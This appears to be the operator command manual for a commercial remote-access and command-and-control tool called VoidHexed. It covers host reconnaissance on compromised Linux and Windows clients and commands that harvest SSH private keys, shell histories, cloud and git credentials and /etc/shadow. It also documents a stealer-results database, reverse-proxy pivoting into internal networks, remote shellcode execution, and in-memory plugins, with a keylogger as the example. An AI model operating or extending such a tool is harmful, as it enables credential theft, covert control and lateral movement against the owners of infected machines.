All commands require exactly **1** Linux client selected. Windows clients are silently skipped.

---

### `luname`
Queries kernel and host identity via `uname(2)`.

```
luname
```

**Output:**
```
[uname]
  OS:       Linux
  Hostname: myserver
  Kernel:   6.1.0-21-amd64
  Version:  #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03)
  Arch:     x86_64
```

---

### `lsysinfo`
Queries uptime, memory, swap and process count via `sysinfo(2)`.

```
lsysinfo
```

**Output:**
```
[sysinfo]
  Uptime:   5d 12h 34m
  RAM:      Total=15.62 GB  Free=4.21 GB  Shared=512.00 MB  Buffered=1.02 GB
  Swap:     Total=2.00 GB  Free=1.87 GB
  Procs:    142
```

---

### `lidentity`
Queries UID/GID/EUID/EGID/PID/PPID.

```
lidentity
```

**Output:**
```
[identity]
  UID=1000  GID=1000  EUID=0  EGID=0
  PID=12345  PPID=12344
  ** Running as root **
```

---

### `ldisks`
Iterates `/proc/mounts` and calls `statfs(2)` on each real mount point. Virtual filesystems are filtered out.

```
ldisks
```

**Output:**
```
[disks] (3 mount points)
  /:       49.09 GB total  23.41 GB free  21.87 GB avail  (47.8% used)
  /boot:   512.00 MB total  390.00 MB free  390.00 MB avail  (23.8% used)
  /home:   200.00 GB total  150.12 GB free  142.55 GB avail  (25.9% used)
```

---

### `losrelease`
Reads `/etc/os-release`.

```
losrelease
```

**Output:**
```
[os-release]
  NAME="Ubuntu"
  VERSION="22.04.3 LTS (Jammy Jellyfish)"
  ID=ubuntu
  ...
```

---

### `lcpu`
CPU count via `sched_getaffinity(2)` + model from `/proc/cpuinfo`.

```
lcpu
```

**Output:**
```
[cpu]
  Logical cores: 8
  Model:         Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz
```

---

### `lnetwork`
Enumerates network interfaces via ioctls (`SIOCGIFCONF`, `SIOCGIFFLAGS`, `SIOCGIFADDR`, `SIOCGIFHWADDR`, etc.).

```
lnetwork
```

**Output:**
```
[network interfaces] (3)
  eth0       flags=1043(UP,RUNNING)  mtu=1500
             inet=192.168.1.10  mask=255.255.255.0
             ether=aa:bb:cc:dd:ee:ff
  lo         flags=0049(UP,LOOPBACK,RUNNING)  mtu=65536
             inet=127.0.0.1  mask=255.0.0.0
```

---

### `lcontainer`
Detects Docker/LXC/Kubernetes by checking `/.dockerenv` and `/proc/1/cgroup`.

```
lcontainer
```

**Output:**
```
[container]
  Containerized: YES
  cgroup:
    12:devices:/docker/a3f2b1c...
```

---

### `lexe`
Resolves the running binary path via `readlink(2)` on `/proc/self/exe`.

```
lexe
```

**Output:**
```
[executable]
  /usr/local/bin/agent
```

---

### `lmachine`
Runs all 9 Linux info sections in a single request (`luname`, `lsysinfo`, `lidentity`, `ldisks`, `losrelease`, `lcpu`, `lnetwork`, `lcontainer`, `lexe`).

```
lmachine
```

---

## Linux — Process Manager
Requires a single Linux client selected.

---

### `lps`
Lists all running processes by enumerating `/proc` via `getdents64(2)`.

```
lps
```

**Output:**
```
[process list] (142 processes)
  PID     PPID    UID    S  RSS(KB)   NAME                 CMDLINE
  ----------------------------------------------------------------------
  1       0       0      S  4096      systemd              /lib/systemd/systemd --system
  423     1       0      S  2048      sshd                 sshd: /usr/sbin/sshd -D
  1051    423     1000   S  8192      bash                 -bash
```

---

### `lpinfo <pid>`
Detailed inspection of a specific process: full `/proc/[pid]/status`, memory maps, open FDs, environment.

```
lpinfo 1051
```

---

### `lkill <pid>`
Sends `SIGKILL` to the specified PID via `kill(2)`.

```
lkill 1234
```

---

## Linux — Credential Harvesting
Requires a single Linux client selected. Home directory is resolved from `/proc/self/environ`.

---

### `lsshkeys`
Collects SSH key material from `~/.ssh/`: private keys, public keys, `known_hosts`, `authorized_keys`, `config`.

```
lsshkeys
```

---

### `lhistory`
Collects shell history files: `.bash_history`, `.zsh_history`, `.sh_history`, `.fish_history`, `.python_history`, `.mysql_history`, `.psql_history`, `.irb_history`.

```
lhistory
```

---

### `lcreds`
Collects credential and config files: `.netrc`, `.git-credentials`, `.aws/credentials`, `.aws/config`, `.docker/config.json`, gcloud ADC JSON, `.kube/config`, GitHub CLI `hosts.yml`, `/etc/passwd`, `/etc/shadow`.

```
lcreds
```

---

## Firewall

Connection-time firewall enforced before a client is admitted. Rules are evaluated in order — **first matching enabled rule wins**. If no rule matches, the **default policy** applies (Allow by default).

Rules and policy are stored in `settings.bin` and take effect immediately without restart.

**L3/L4 targets:** `ip`, `cidr`, `country`, `hwid`
**L7 targets:** `platform`, `privilege`, `username`, `osversion`
**Match modes** (only for `username` and `osversion`): `exact` (default), `contains`, `startswith`, `endswith`

---

### `firewall policy <allow|deny>`
Sets the default policy applied when no rule matches a connecting client.

```
firewall policy allow
firewall policy deny
```

---

### `firewall add <name> <allow|deny> <target> <value> [matchmode]`
Adds a new firewall rule. Rules are appended to the end of the list (lowest priority). Match mode is optional and only meaningful for `username` and `osversion` targets.

**Usage:**
```
firewall add <name> <allow|deny> <target> <value> [exact|contains|startswith|endswith]
```

| Target      | Layer | Description                                    | Example value       |
|-------------|-------|------------------------------------------------|---------------------|
| `ip`        | L3    | Exact IP address match                         | `1.2.3.4`           |
| `cidr`      | L3    | CIDR range match                               | `10.0.0.0/8`        |
| `country`   | L3    | 2-letter country code from client region flag  | `RU`                |
| `hwid`      | L3    | Exact hardware ID match                        | `AABBCCDD`          |
| `platform`  | L7    | Client OS: `windows` or `linux`                | `linux`             |
| `privilege` | L7    | Client privilege: `admin` or `user`            | `admin`             |
| `username`  | L7    | Client username (supports match modes)         | `badactor`          |
| `osversion` | L7    | Client OS version string (supports match modes)| `Windows 7`         |

**Examples:**
```
firewall add block_ip     deny ip      1.2.3.4
firewall add block_range  deny cidr    10.0.0.0/8
firewall add block_cn     deny country CN
firewall add block_hwid   deny hwid    AABBCCDD
firewall add linux_only   deny platform windows
firewall add no_admin     deny privilege admin
firewall add block_user   deny username badactor contains
firewall add block_xp     deny osversion "Windows XP" startswith
```

---

### `firewall remove <name>`
Permanently removes a rule by name.

```
firewall remove block_ip
```

---

### `firewall enable <name>`
Re-enables a disabled rule.

```
firewall enable block_ip
```

---

### `firewall disable <name>`
Disables a rule without removing it. Disabled rules are skipped during evaluation.

```
firewall disable block_ip
```

---

### `firewall list`
Lists all rules: status indicator, name, action, target, value, match mode, and cumulative hit count since startup.

```
firewall list
```

**Output example:**
```
[Firewall] Policy: ALLOW  (3 rules)
  [ON]  block_range  DENY    cidr      10.0.0.0/8   =  hits=7
  [ON]  block_cn     DENY    country   CN            =  hits=0
  [OFF] block_user   DENY    username  badactor      ≈  hits=0
```

---

### `firewall move <name> <up|down>`
Moves a rule one position up or down in the evaluation order (first matching enabled rule wins).

```
firewall move block_range up
firewall move block_user down
```

---

### `firewall test <ip> <country> <hwid> <username> <osversion> <platform> <privilege>`
Dry-run evaluation — shows ALLOW/DENY and which rule matched, without modifying hit counts.

```
firewall test 1.2.3.4 CN AABB john "Windows 10" windows user
firewall test 5.6.7.8 US CCDD admin "Ubuntu 22.04" linux root
```

---

## UI — Context Menu

Right-clicking (or hovering) the **IP** column in the Clients grid opens a context menu with the following items:

| Item            | Description                                                                 |
|-----------------|-----------------------------------------------------------------------------|
| **Select**      | Sets the command input to `select <ip>` for quick selection                 |
| **Toggle Select** | Adds or removes this client from the active multi-selection               |
| **Deselect All** | Clears the entire selection                                                |
| **Copy IP**     | Copies the client IP:Port to the clipboard                                  |
| **Copy HWID**   | Copies the client HWID to the clipboard                                     |
| **View Log**    | Navigates to the per-client log page for this client                        |
| **Disconnect**  | Immediately disconnects this client (calls `Clean()` on the connection)     |

### Per-Client Log Page

Accessed via **View Log** in the context menu. Shows a dedicated log panel for the selected client containing:

- A connection banner: `=== Connected: <HWID> · <IP> · <Username> · <OS> ===`
- All command output routed specifically to this client (shell, syscall, stealer, file manager, exploit)
- A `=== Disconnected ===` footer appended when the client disconnects
- Page header includes: IP, HWID, username, OS version, connected-at timestamp
- **Back** button returns to the Clients page
- **Clear** button wipes the per-client log

---

## Database (`db`)

Persistent SQLite store saved to `void.db` in the working directory (WAL mode). Four tables are populated automatically — no configuration needed.

| Table               | Populated by                                    |
|---------------------|-------------------------------------------------|
| `connection_events` | Every client connect / disconnect               |
| `firewall_hits`     | Every matched firewall rule (allow or deny)     |
| `build_history`     | Every successful `build w` / `build l`          |
| `stealer_results`   | HISTORY, AUTOFILL, KEYWORD, LINUX_CREDS results |

---

### `db stats`
Shows row counts for all four tables.

```
db stats
```

---

### `db events [filter] [--limit N]`
Queries `connection_events`. Optional filter matches IP or HWID substring. Default limit 50.

```
db events
db events 192.168.1
db events deadbeef-hwid --limit 20
```

---

### `db hits [rule_name] [--limit N]`
Queries `firewall_hits`. Optional rule name is an exact match filter. Default limit 50.

```
db hits
db hits block-CN
db hits --limit 200
```

---

### `db builds [--limit N]`
Queries `build_history`. Shows cert, port, OS, host, and output filename per build. Default limit 50.

```
db builds
db builds --limit 10
```

---

### `db stealer [ip] [--limit N]`
Queries `stealer_results`. Optional IP substring filter. Default limit 50.

```
db stealer
db stealer 10.0.0.5
db stealer --limit 5
```

---

### `db clear <events|hits|builds|stealer|all>`
Deletes all rows from the specified table (or all four if `all`). Irreversible.

```
db clear hits
db clear all
```

---

## Reverse Proxy (`proxy`)
All `proxy` commands require exactly **1** client selected (except `proxy list`). `proxy recon` is Windows-only; all other proxy commands work on both Windows and Linux clients.

---

### `proxy connections`
Lists all TCP connections currently active through the selected client's proxy session — connection ID and `target:port`.

**Usage:**
```
proxy connections
```

**Output example:**
```
[192.168.1.10] 3 connection(s) on :1080
  #0042  accounts.google.com:443
  #0043  10.10.20.15:8080
  #0044  10.10.20.1:3389
```

---

### `proxy start <port>`
Starts a SOCKS5 / HTTPS-CONNECT reverse proxy on the C2 server that tunnels traffic through the selected client's TCP stack. The proxy listens on `127.0.0.1:<port>`. Configure any local application (browser, proxychains, Burp) to use `socks5://127.0.0.1:<port>`.

**Usage:**
```
proxy start 1080
proxy start 8080
```

**Notes:**
- Only one proxy session per client. A second `proxy start` on the same client replaces the previous one.
- Supports both SOCKS5 and HTTP CONNECT tunnels on the same port.
- IPv4 targets only; IPv6 destinations will return a SOCKS5 error.

---

### `proxy stop`
Stops the active proxy session for the selected client, closes all open tunnel connections, and frees the listen port.

**Usage:**
```
proxy stop
```

---

### `proxy list`
Lists all clients that currently have an active proxy session running, along with their IP and listen port.

**Usage:**
```
proxy list
```

**Output example:**
```
[Proxy] 192.168.1.10:54321 → port 1080
[Proxy] 10.0.0.5:49152   → port 8888
```

---

### `proxy recon <dns|dhcp|net|domain|sysproxy|all>`
Sends a recon request to the selected client to enumerate internal network topology and host configuration. Results are printed to the client message panel. **Does not require an active proxy session.**

| Subcommand | Data collected |
|------------|---------------|
| `dns`      | Hostname, per-adapter DNS servers, DNS search suffixes, probed internal hostnames (dc, wpad, fileserver, exchange, …) |
| `dhcp`     | Per-adapter type, MAC, IPv4/IPv6 addresses, default gateways, DHCP servers, DNS servers, suffix |
| `net`      | All active TCP and UDP listeners on the host — reveals local services reachable through the tunnel (DBs, admin panels, etc.) |
| `domain`   | AD identity: `LOGONSERVER`, `USERDOMAIN`, `USERDNSDOMAIN`, `COMPUTERNAME`, joined domain name — confirms AD membership and DC |
| `sysproxy` | System proxy settings from the registry: ProxyServer, ProxyOverride (bypass list), PAC file URL, AutoDetect — reveals corporate proxy hops |
| `arp`      | ARP cache via `GetIpNetTable` — IPv4 neighbors the host has recently seen. Free host discovery without sending a single packet |
| `all`      | All six sections combined |

**Usage:**
```
proxy recon dns
proxy recon dhcp
proxy recon net
proxy recon domain
proxy recon sysproxy
proxy recon arp
proxy recon all
```

**Notes:**
- Recon runs over the C2 channel and is completely independent of the proxy tunnel — run it at any time, in any order.
- `proxy recon net` is useful mid-session to discover services on the target that you can reach through an already-active tunnel.

**Example proxy workflow:**
1. `proxy start 1080` — open proxy tunnel
2. Configure tool to use `socks5://127.0.0.1:1080`
3. `proxy recon net` / `proxy recon domain` — enumerate from inside as needed
4. `proxy stop` — tear down when done

---

## ASM IDE (`asmide`)
Per-client interactive 64-bit assembly editor. Windows clients only. Shellcode is compiled server-side, compressed with QuickLZ, and executed client-side via `NtCreateThreadEx`. Crashes are caught by a VEH guard and reported as errors rather than killing the client.

**`"module.Function"` syntax** — write quoted `"module.Function"` literals anywhere in active (non-comment) code. The preprocessor replaces each unique reference with a random 8-byte placeholder, compiles the source, then the client resolves each placeholder to the real exported function address at runtime via `GetProcedureAddressRemote` (ordinal 100).

**Special literal:** `"voidhexed.result_buf"` is always patched to the address of the output buffer allocated on the client. Write your result there; the server reads it back and displays it according to the result type.

**Result types:**

| Type | Size | Display |
|------|------|---------|
| *(empty)* | — | No output buffer allocated |
| `u64` | 8 bytes | `0x{value:X16}` |
| `ntstatus` | 4 bytes | Severity + symbolic name |
| `str` | 256 bytes | Null-terminated UTF-8 string |
| `bytes,N` | N bytes | Hex dump |
| `struct,N` | N bytes | Hex dump |
| `ptr,N` | 8-byte pointer → N bytes | Dereferences the pointer, hex dump of N bytes |

**Compilers** (placed in `Assets/Assembler/`):

| Flag | Windows | Linux | Output | Hidden header |
|------|---------|-------|--------|---------------|
| `fasm` *(default)* | `FASM.EXE` | `fasm-lin/fasm.x64` | flat binary | `format binary` / `use64` / `org 0` |
| `nasm` | `nasm.exe` | `nasm-lin/nasm` | flat binary | `BITS 64` / `DEFAULT REL` |
| `ml64` | `ml64.exe` | `gcc-lin/llvm-ml64` | COFF .obj → `.text` extracted | `.code` / `__vhpayload PROC` + `ENDP`/`END` footer |

Headers are injected silently; the editor never shows them. Flags and syntax are identical on both platforms. The server compiles locally and sends the resulting shellcode to the Windows client.

---

### `asmide open`
Opens the per-client ASM IDE tab for the selected Windows client. The editor supports Tab-autocomplete for mnemonics at line start, registers after a mnemonic, and `"module.Function"` API names inside quotes. Editor content is preserved per-client across page switches.

**Usage:**
```
asmide open
```

Also available via right-click → **Open ASM IDE** on the clients grid (Windows clients only).

---

### `asmide run <filepath> [resulttype] [--compiler fasm|nasm|ml64]`
Reads an ASM source file, preprocesses it, compiles it, and sends the shellcode to all selected Windows clients. Blocks until compile/send completes; execution is asynchronous (result arrives via `ASMIDE_ANSWER_REQUEST`).

**Usage:**
```
asmide run <filepath>
asmide run <filepath> <resulttype>
asmide run <filepath> <resulttype> --compiler <fasm|nasm|ml64>
```

**Examples:**
```
asmide run shellcode.asm
asmide run shellcode.asm u64
asmide run shellcode.asm ntstatus
asmide run shellcode.asm str
asmide run shellcode.asm bytes,64
asmide run shellcode.asm struct,48
asmide run shellcode.asm u64 --compiler nasm
asmide run shellcode.asm struct,48 --compiler ml64
```

**Stack alignment note (FASM / NASM):** shellcode entry is called via `RtlUserThreadStart → CALL`, so RSP = 16n−8 on entry. Use `sub rsp, 0x28` (shadow space only) or `sub rsp, 0x38`/`0x48`/etc. to re-align and reserve locals. Always pair with the matching `add rsp, N` before `ret`.

---

### `asmide close`
Closes the ASM IDE tab and returns to the clients page.

**Usage:**
```
asmide close
```

---

## Plugin (`plugin`)
Cross-platform in-memory plugin execution. The server loads `.vhp` archives (ZIP with `manifest.json` + binaries), selects the best binary for each client OS, compresses it with QuickLZ, and sends it via `PLUGIN_EXECUTE_REQUEST`. Windows clients load via a reflective PE DLL loader (for `.dll`) or a COFF/BOF loader (for `.obj`). Output streams back in real time to the Plugins page.

**Plugin binary formats:**
| Flag | Format | Loader |
|------|--------|--------|
| `win_dll.dll` | Reflective PE DLL | Manual map: headers, relocations, IAT, VirtualProtect per-section, DllMain |
| `win_obj.obj` | COFF/BOF | Single RWX alloc, AMD64 relocations, external symbol resolution |
| `linux_elf.so` | ELF shared object | *(future)* |

**Host API vtable (VHPlugin.h):**
```c
void  log(int level, const char* msg);       // level: 0=INFO 1=WARN 2=ERROR
void* mem_alloc(size_t sz);
void  mem_free(void* ptr);
int   emit_result(const void* buf, size_t len, int flags);  // flags: EMIT_TEXT=0, EMIT_BINARY=1
int   check_cancel(void);                    // returns 1 if cancellation was requested
```

---

### `plugin load <path.vhp>`
Loads a `.vhp` plugin archive into the server registry. The archive must contain `manifest.json` and at least one binary. After loading the plugin appears on the Plugins page and is available for `plugin run`.

**Usage:**
```
plugin load <path.vhp>
```

**Examples:**
```
plugin load C:\plugins\keylogger.vhp
plugin load /opt/plugins/sysinfo.vhp
```

---

### `plugin unload <id>`
Removes a plugin from the registry. Cannot unload a plugin with status `Running`.

**Usage:**
```
plugin unload <id>
```

**Examples:**
```
plugin unload keylogger
plugin unload sysinfo-1.0
```

---

### `plugin list`
Lists all loaded plugins: ID, version, mode, status, binary formats, and defined arguments.

**Usage:**
```
plugin list
```

---

### `plugin run <id> [args...]`
Sends a plugin to all selected clients for in-memory execution. Arguments are space-separated strings packed into the `PluginRequest.PackedArgs` buffer and passed to `plugin_run(args, args_len)`. Results stream back to the Plugins page in real time.

**Usage:**
```
plugin run <id>
plugin run <id> [arg1 arg2 ...]
```

**Examples:**
```
plugin run keylogger
plugin run sysinfo verbose
plugin run scanner 192.168.1.0/24 80 443
```

---

### `plugin cancel <id>`
Sends a `PLUGIN_CANCEL_REQUEST` to all selected clients. The plugin must poll `check_cancel()` from its vtable to honour the signal.

**Usage:**
```
plugin cancel <id>
```

**Example:**
```
plugin cancel keylogger
```

---

### `plugin pack <output.vhp> [--win-dll <path>] [--win-obj <path>] [--linux-o <path>]`
Packages binaries and `manifest.json` (must exist in the working directory) into a `.vhp` archive. At least one binary flag is required.

**Usage:**
```
plugin pack <output.vhp> --win-dll <path>
plugin pack <output.vhp> --win-dll <path> --win-obj <path> --linux-o <path>
```

**Examples:**
```
plugin pack keylogger.vhp --win-dll keylogger.dll
plugin pack sysinfo.vhp --win-dll sysinfo.dll --win-obj sysinfo.obj --linux-o sysinfo.so
```

## Memory Read (`readat`)

Reads bytes from the agent process's own virtual address space and displays them as a hex dump on the server. Useful for inspecting mapped memory, verifying shellcode placement, or reading data structures at known addresses.

Works on both Windows and Linux clients. Size is capped at **1 MB** per request.

### `readat <address> <size>`

**Address** — decimal integer or hex with `0x` prefix.
**Size** — number of bytes to read (max 1 048 576).

**Windows:** uses `ReadProcessMemory` with the current-process pseudo-handle (`-1`). If the address is not mapped the call fails and the error code is returned.
**Linux:** reads `/proc/self/mem` seeked to the given offset. An `IOException` (EFAULT) is returned for unmapped pages.

**Output format:**
```
[readat] 0x00007FF800001000  (64 bytes):
  00007FF800001000  48 89 5C 24 08 48 89 74  24 10 57 48 83 EC 20 48  H.\$.H.t $.WH.. H
  00007FF800001010  8B 05 F9 1F 00 00 48 85  C0 74 16 48 8D 0D 08 21  ......H. .t.H..!
  ...
```

**Usage:**
```
readat <address_decimal_or_hex> <size>
```

**Examples:**
```
readat 0x7FF800000000 256
readat 0x7FF800001000 64
readat 140736353812480 512
```

---

## License

### `license register <email> <key> [<server> <port> [cert_sha256]]`

Saves license email and key to settings. If server and port are provided, also registers this machine with the LicenseWebAPI over HTTPS using HMAC-SHA256 request signing. Without server/port, only saves credentials locally (build will require WebAPI to be configured separately or via explicit args in the build command).

For self-signed WebAPI HTTPS, pass the server certificate SHA-256 fingerprint as `cert_sha256`; VoidHexed saves it and pins future register/build/unregister calls to that certificate.

`lic_ca_public.pfx` next to VoidHexed.exe is recommended for offline blob verification but not required for registration. Each license supports up to 2 machines. If the limit is reached, the server returns the registered machine list.

**Usage:**
```
license register <email> <key>
license register <email> <key> <server> <port>
license register <email> <key> <server> <port> <cert_sha256>
```

**Examples:**
```
license register user@example.com abcdef0123456789
license register user@example.com abcdef0123456789 licenses.example.com 5000
license register user@example.com abcdef0123456789 http://192.168.1.100:5000 5000
license register user@example.com abcdef0123456789 licenses.example.com 5000 aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899
```

### `license unregister <1|2>`

Removes a machine slot (1 or 2) from the license. Uses the machine list from the last `license register` attempt that returned LIMIT_REACHED. After unregistering, automatically re-registers the current machine.

**Usage:**
```
license unregister <1|2>
```

**Examples:**
```
license unregister 1
license unregister 2
```
